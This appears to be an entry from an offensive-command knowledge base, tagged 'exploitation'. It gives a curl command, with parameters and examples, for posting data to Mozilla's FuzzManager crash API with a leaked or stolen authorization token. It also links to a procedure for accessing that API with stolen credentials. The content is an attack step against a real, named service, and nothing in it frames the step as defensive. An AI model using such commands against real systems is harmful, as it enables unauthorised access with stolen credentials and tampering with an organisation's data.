---
id: cmd-curl-api-write-001
data: >-
  curl -X POST -H "Authorization: Token YOUR_LEAKED_TOKEN" -d
  '{"platform":"test", "signature":"test@sig"}'
  https://fuzzmanager.fuzzing.mozilla.org/api/v1/crashes/
tags:
  - curl
  - api
  - write
  - exploitation
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:38.855Z'
verified: false
validated: true
submitted: true
---
# curl-api-write

## Command

```bash
curl -X POST -H "Authorization: Token YOUR_LEAKED_TOKEN" -d '{"platform":"test", "signature":"test@sig"}' https://fuzzmanager.fuzzing.mozilla.org/api/v1/crashes/
```

## Description

Sends an authenticated POST request to the FuzzManager API to create or modify fuzzing data using a stolen token.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method for creation | Yes |
| `-H "Authorization: Token YOUR_LEAKED_TOKEN"` | Auth header | Yes |
| `-d 'data'` | JSON payload for the request | Yes |
| `https://.../api/v1/crashes/` | API endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -H "Authorization: Token abc123" -d '{"signature":"test"}' https://fuzzmanager.fuzzing.mozilla.org/api/v1/crashes/
```

### Advanced Usage

```bash
curl -X POST -H "Authorization: Token abc123" -H "Content-Type: application/json" -d '{"platform":"win", "testcase":"data"}' https://fuzzmanager.fuzzing.mozilla.org/api/v1/crashes/
```

## Expected Output

{"id":123,"platform":"test","signature":"test@sig",...} (HTTP 201)

## Related

- [[commands/curl-api-read]]
- [[procedures/Access-FuzzManager-API-with-Stolen-Token]]
